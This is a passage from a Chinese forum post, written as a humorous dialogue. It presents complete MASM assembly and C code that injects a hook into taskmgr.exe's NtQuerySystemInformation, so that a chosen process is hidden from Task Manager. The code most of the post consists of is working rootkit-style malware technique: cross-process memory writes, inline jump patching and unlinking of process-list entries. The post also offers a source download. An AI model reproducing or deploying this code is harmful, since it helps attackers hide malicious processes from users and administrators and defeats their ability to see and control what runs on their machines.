
```asm
.386
.model flat, stdcall
option casemap:none
.nocref
.nolist
include  D:\work\masm32\include\windows.inc
include  D:\work\masm32\include\user32.inc
include  D:\work\masm32\include\kernel32.inc
.list
.listmacro
.listmacroall
IFNDEF UNICODE\_STRING
 UNICODE\_STRING struct
  \_Length  WORD ?
  MaximumLength WORD ?
  Buffer  PWSTR ?
 UNICODE\_STRING ends
 PUNICODE\_STRING typedef ptr UNICODE\_STRING
ENDIF
SPI struct
 NextOffset DWORD ?
   DWORD ?
 Times  QWORD 6 dup(?)
 ImageName UNICODE\_STRING <?>
   DWORD ?
 ProcessId DWORD ?
 Reserved DWORD 7 dup(?)
SPI ends
PSPI typedef ptr SPI
  .const
szDll  db "ntdll.dll",0
szQSI\_func db "NtQuerySystemInformation",0
  .code
;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
RT\_BIN\_START equ $
 PID  DWORD ? ;要隐藏进程的 pid
 pQSI\_func DWORD ?
 pQSI\_Next DWORD ?
 pBuf  DWORD ?
 pRetAddr DWORD ?
 pPreviousSPI PSPI 0
 dwEBX  DWORD ?
 ;ORGBIN  byte 5 dup(?)
 FIXBIN  byte 5 dup(?)
RT\_CODE\_OFFSET equ $ - RT\_BIN\_START
len0 textequ %RT\_CODE\_OFFSET
% echo RT\_CODE\_OFFSET is len0
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
myQSI\_func proc
 mov ecx,ebx
 call @F
@@:
 pop ebx
 sub ebx,offset @B
 jmp DOIT
GoMaMa:
 mov eax,dword ptr \[esp\]
 mov dword ptr \[esp + 4\],eax
 pop eax
 ORGBIN byte 5 dup(?)
 jmp \[ebx + pQSI\_Next\]
DOIT:
 mov dword ptr \[ebx + dwEBX\],ecx
 mov dword ptr \[ebx + pBuf\],0
 push dword ptr \[esp\]
 pop dword ptr \[ebx + pRetAddr\]
 .if dword ptr \[esp + 4\] == 5
  push dword ptr \[esp+8\]
  pop dword ptr \[ebx + pBuf\]
 .endif
  
 call GoMaMa
 ;调用原始 QSI 成功且是获取 SPIs 的调用
 .if eax == 0 && dword ptr \[ebx + pBuf\] != 0
  assume eax:PSPI
  mov ecx,dword ptr \[ebx + PID\]
  mov eax,dword ptr \[ebx + pBuf\]
  .while TRUE
.if \[eax\].ProcessId == ecx
.if \[eax\].NextOffset == 0
mov eax,\[ebx + pPreviousSPI\]
mov \[eax\].NextOffset,0
.else
mov ecx,\[eax\].NextOffset
mov eax,\[ebx + pPreviousSPI\]
add ecx,\[eax\].NextOffset
mov \[eax\].NextOffset,ecx
.endif
.break
.endif
.break .if \[eax\].NextOffset == 0
push eax
pop dword ptr \[ebx + pPreviousSPI\]
add eax,\[eax\].NextOffset
.endw
  assume eax:nothing
 .endif
 
 mov ecx,ebx
 mov ebx,\[ebx + dwEBX\]
 jmp \[ecx + pRetAddr\]
 ;ret
myQSI\_func endp
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
RT\_BIN\_END equ $
RT\_BIN\_LEN equ RT\_BIN\_END - RT\_BIN\_START
T\_BIN\_LEN textequ %RT\_BIN\_LEN
% echo RT\_BIN\_LEN is T\_BIN\_LEN
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
hookQSIfunc proc C uses ebx edi esi ph:HANDLE,pid:DWORD
 local bSuccess,pRTBin,oldProtect
 
 mov bSuccess,FALSE
 .if pid == 0
  jmp QUIT
 .endif
 invoke VirtualProtect,offset RT\_BIN\_START,\
  T\_BIN\_LEN,PAGE\_EXECUTE\_READWRITE,\
  addr oldProtect
 .if !eax
  jmp QUIT
 .endif
 invoke LoadLibrary,addr szDll
 invoke GetProcAddress,eax,addr szQSI\_func
 .if !eax
  jmp QUIT
 .endif
 mov pQSI\_func,eax
 
 invoke VirtualAllocEx,ph,NULL,T\_BIN\_LEN,\
  MEM\_COMMIT,PAGE\_EXECUTE\_READWRITE
 .if !eax
  jmp QUIT
 .endif
 mov pRTBin,eax
 
 invoke ReadProcessMemory,ph,pQSI\_func,\
  addr ORGBIN,5,NULL
 .if !eax
  jmp QUIT
 .endif
 mov eax,pRTBin
 add eax,RT\_CODE\_OFFSET
 sub eax,pQSI\_func
 sub eax,5
 mov byte ptr \[FIXBIN\],0E9h
 mov dword ptr \[FIXBIN+1\],eax
 
 mov eax,pQSI\_func
 add eax,5
 mov pQSI\_Next,eax
 push pid
 pop PID
 invoke WriteProcessMemory,ph,pRTBin,\
  offset RT\_BIN\_START,T\_BIN\_LEN,NULL
 .if !eax
  jmp QUIT
 .endif
 invoke WriteProcessMemory,ph,pQSI\_func,\
  addr FIXBIN,5,NULL
 .if !eax
  jmp QUIT
 .endif
 
 mov bSuccess,TRUE
QUIT:
 .if pRTBin
  ;invoke VirtualFreeEx,ph,pRTBin,\
   ;T\_BIN\_LEN,MEM\_RELEASE
 .endif
 mov eax,bSuccess
 ret
hookQSIfunc endp
;\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
 end
```

阿宝:你好像是 `HOOK` 之后，直接将以上代码拷贝到 `taskmgr.exe` 进程空间中，

等待其自动调用，是吗？

加菲:没错，拷贝功能的函数即是 `hookQSIfunc()`，当然这要首先保证 `taskmgr` 在运行:

代码:

```c
//检查 taskmgr.exe 当前是否在运行
DWORD findtm(void)
{
 DWORD pid = 0;
 
 PROCESSENTRY32 process = {.dwSize=sizeof(PROCESSENTRY32)};
 HANDLE hss = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS,0);
 Process32First(hss,&process);
 while(Process32Next(hss,&process))
 {
  if(!strcmp(process.szExeFile,"taskmgr.exe"))
  {
   pid = process.th32ProcessID;
   break;
  }
 }
 
 CloseHandle(hss);
 return pid;
}
```

阿宝（暗笑）:是这样啊...嘿嘿

加菲(聚精会神地):这样一来无论哪个版本的 `taskmgr`，只要获取机制没有变，

都可以搞定了，呵呵...终于搞定了...那个报酬怎么算...(回头),人呢???

阿宝(全裸速逃中...)

加菲:阿宝，你竟然敢欺骗偶的感情....

愤怒的加菲制造了 `N` 个加菲猫终结者 `T1300` 型追杀阿宝，至于阿宝能否逃脱，

这是另一个故事了哦。

（PS1：使用了电影分镜头剧本结构，适合改编为 `cartoon` 或 `flash` 之类的咚咚,结尾不是很好，修改中）

（PS2: 场景的选择是从刚看完的 `终结者 2018` 获得的。）

源代码下载:

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `fkTM.rar`
|
